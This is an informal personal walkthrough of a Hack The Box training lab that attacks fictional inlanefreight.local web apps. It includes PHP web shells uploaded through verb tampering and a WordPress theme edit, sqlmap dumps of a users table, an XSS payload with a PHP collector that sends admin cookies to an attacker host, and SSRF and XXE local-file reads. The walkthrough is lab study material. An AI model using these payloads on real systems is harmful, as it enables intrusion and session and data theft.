okay so this ones kinda new cause we skipped this section lol but weve been doing this in THM for years now so... ya 

anyway lets start with adding ALL subdomains we doing to /etc/hosts and a secondary file named something likie -> ILfreight_subdomains 

inlanefreight.local 
blog.inlanefreight.local 
careers.inlanefreight.local 
dev.inlanefreight.local 
gitlab.inlanefreight.local 
ir.inlanefreight.local 
status.inlanefreight.local 
support.inlanefreight.local 
tracking.inlanefreight.local 
vpn.inlanefreight.local
monitoring.inlanefreight.local


add all subdomains to file -> add all subdomains to /etc/hosts with target IP -> sudo apt install eyewitness -> run eyewittness : eyewitness -f ILfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness -> open the findings to help with questions... lets begin 



Question 1 - Use the IDOR vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}). - HTB{8f40ecf17f681612246fa5728c159e46}
1) from reading section we see were going to start at http://careers.inlanefreight.local
2) register with fake creds and email test@aol.com + tester:Te$t3r!
3) we see the url now says -> http://careers.inlanefreight.local/profile?id=9 
4) open burp 
5) enable on browser + hot refresh
6) in burp send to repeater and play with id= 
7) actually jk jsut play with it in the browser. 
8) find id=4 -> htb-student -> HTB{8f40ecf17f681612246fa5728c159e46}

Question 2 - Exploit the HTTP verb tampering vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}). -HTB{57c7f6d939eeda90aa1488b15617b9fa}
 
1) from the section we see were deraling with http://dev.inlanefreight.local
2) they ran a gobuster for us and there is a uploads and upload.php section 
3) FROM THE SECTION: We'll need Burp Suite here to capture the request and see if we can figure out what's going on. If we capture the request and send it to Burp Repeater and then re-request the page using the OPTIONS method, we see that various methods are allowed: GET,POST,PUT,TRACK,OPTIONS. Cycling through the various options, each gives us a server error until we try the TRACK method and see that the X-Custom-IP-Authorization: header is set in the HTTP response. We can consult the Web Attacks modules on HTTP Verb Tampering for a refresher on this attack type.
4) go to http://dev.inlanefreight.local/upload.php -> catch in burp
5) in repeeater change GET to TRACK 
6) now in the response tab we get - X-Custom-IP-Authorization: 172.18.0.1 
7) NOW in the request tab add X-Custom-IP-Authorization: 127.0.0.1 -> i did this aboce the Connection: field
8) okay now close burp, the OPEN BURP BROWSER TO START and do all these steps again because... why not. 
9) get to the response page of the TRACK reuqest and then go to browse, we can upload a webshell jsut save it with the .php extension 
10) <?php system($_GET['cmd']); ?>  -> save to 456789.php jk to .png 
11) find the post  request and alter the header to Content-Type: image/png
12) in request tab it should show - File uploaded /uploads/456789.php
13) in commandline -> curl http://dev.inlanefreight.local/uploads/456789.php?cmd=id
14) curl "http://dev.inlanefreight.local/uploads/456789.php?cmd=ls%20-lah%20/var/www/html"
15) we see flag.txt is in there 
16) curl "http://dev.inlanefreight.local/uploads/456789.php?cmd=cat%20%2Fvar%2Fwww%2Fhtml%2Fflag.txt" - HTB{57c7f6d939eeda90aa1488b15617b9fa}

* dumb * 

Question 3 - Exploit the WordPress instance and find a flag in the web root. Submit the flag value as your answer (flag format: HTB{}). - HTB{e7134abea7438e937b87608eab0d979c}

1) looks like were dealing with http://ir.inlanefreight.local
2) sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
3) from output robots.txt found: http://ir.inlanefreight.local/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%
4) lol once again jk... FROM THE FUCKIN SECTION : ] ] ] ] ] -> From here, we can browse to http://ir.inlanefreight.local/wp-login.php and log in using the credentials ilfreightwp:password1. Once logged in, we'll be directed to http://ir.inlanefreight.local/wp-admin/ where we can browse to http://ir.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty to edit the 404.php file for the inactive theme Twenty Twenty and add in a PHP web shell to get remote code execution 
5) edit 404 file and add -> system($_GET[0]); 
6) now we can just curl it like last time 
7) curl http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php?0=id
8) curl http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php?0=ls%20-lah%20/var/www/html
9) curl http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php?0=cat%20%2Fvar%2Fwww%2Fhtml%2Fflag.txt - HTB{e7134abea7438e937b87608eab0d979c}


 Question 4 - Enumerate the "status" database and retrieve the password for the "Flag" user. Submit the value as your answer. - 1fbea4df249ac4f4881a5da387eb297cf 
1) go to http://status.inlanefreight.local 
2) put * in the search form then enable burp and catch a POST request 
3) save the POST REQUSET from burp as req.txt ( or whatever you want ) 
4) sqlmap -r req.txt --dbms=mysql -D status --tables -> find company and users at the end
5) sqlmap -r req.txt -D status -T users --columns --batch
6) sqlmap -r req.txt -D status -T users --dump --batch
7) id | password                          | username |
+----+-----------------------------------+----------+
| 1  | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | Admin    |
| 2  | 1fbea4df249ac4f4881a5da387eb297cf | Flag   



Question 5 - Steal an admin's session cookie and gain access to the support ticketing queue. Submit the flag value for the "John" user as your answer.
1)http://support.inlanefreight.local 
2)  http://support.inlanefreight.local/ticket.php
3) "><script src=http://10.10.15.125:9000/TESTING_THIS</script>
4) nc -nlvp 9000 -> catches this 
5)Now we need to figure out how we can steal an admin's cookie so we can log in and see what type of access we can get. We can do this by creating the following two files:

index.php 
6) <?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

7) script.js: new Image().src='http://10.10.15.125:9200/index.php?c='+document.cookie
8) Next, start a PHP web server on your attack host as follows: sudo php -S 0.0.0.0:9200
10) Finally, create a new ticket and submit the following in the message field: "><script src=http://10.10.14.15:9200/script.js></script> 
11) index.php?c=session=fcfaf93ab169bc943b92109f0a845d99
12 insepect -> storage -> cookies -> session + fcfaf93ab169bc943b92109f0a845d99
13) refresh and were in HTB{1nS3cuR3_c00k135}

Question 6 - Use the SSRF to Local File Read vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).
ima come back to this on 2/24... taking a day to spend with tyler becauuse this is year 6 since losing his momma and i need to be there for my friend in need.
1) sup fammo so we navigate to http://tracking.inlanefreight.local 
2) in the track now entry form enter this XML script: 
<script>
	x=new XMLHttpRequest;
	x.onload=function(){
	document.write(this.responseText)};
	x.open("GET","file:///flag.txt");
	x.send();
</script>
3) output: HTB{49f0bad299687c62334182178bfd75d8} 

Question 7 - Register an account and log in to the Gitlab instance. Submit the flag value (flag format : HTB{}).
1) go to http://gitlab.inlanefreight.local 
2) register tester account 
3) once registered go to http://gitlan.inalnefreight.local/explore
4) first project = flag  -> HTB{32596e8376077c3ef8d5cf52f15279ba}



Question 8 - Use the XXE vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).

1) from the gitlab explore page we see theres another subdomain scalled 'shopdev2.inlanefreight.local' -> add this to /etc/hosts 
2) once in log in with the weak creds of admin:admin 
3) go to the checkout or /cart.php page -> enable burp proxy and open burp
4) once burps up and running hit i agree and check out 
5) sent POST request to Repeater 
6) edit the XML portion of the request to now read as below: 


XXE = <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///flag.txt">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxetest;
	</userid>
</root>

output: 		HTB{dbca4dc5d99cdb3311404ea74921553c} 

Question 9 - Use the command injection vulnerability to find a flag in the web root. Submit the flag value as your answer (flag format: HTB{}). 





